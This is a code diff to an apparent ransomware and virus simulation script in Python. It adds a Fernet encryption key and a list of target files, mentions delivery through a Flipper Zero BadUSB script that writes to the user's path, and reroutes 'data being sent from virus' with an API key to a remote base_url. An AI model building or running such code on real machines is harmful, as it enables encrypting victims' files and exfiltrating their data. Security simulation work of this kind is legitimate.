@@ -35,6 +35,21 @@ file_extension = ".txt"
 
 
 
+# Ransomeware simulation variables 
+# Generate a random key for encryption
+encryption_key = Fernet.generate_key()
+cipher_suite = Fernet(encryption_key)
+
+# Directory and file configuration, testing with hardcoded path, 
+# if run with flipper zero badusb script it saves to the user path instead of the test folder
+# test_directory = "ransomware_test"
+test_directory = "C:\\TestVirusPath\\ransomware_test"
+file_count = 200
+file_prefix = "test_file_"
+file_extension = ".txt"
+
+
+
 
 ##########################
 #### Helper Functions ####
@@ -59,11 +74,15 @@ base_url = get_base_url()
 
 def data_to_send(data):
     try:
+        # Validate and print the data structure
+        print("API_KEY:", API_KEY)
+        print("Data being sent from virus:", data)
         # f"{base_url}/api/datatosend",
         response = requests.post(
-            "http://127.0.0.1:5000/api/datatosend",
+            f"{base_url}/api/datatosend",
             json={"api_key": API_KEY, "data": data},
         )
+        print(response.text)
         if response.status_code == 200:
             print("Data sent successfully.")
         else:
@@ -505,6 +524,7 @@ def use_case_checker():
             if func:
                 result = func()
                 logs.append(result)
+                print("------------------------------------------")
             else:
                 logging_func(f"Use case function {use_case} not found.")
     return logs
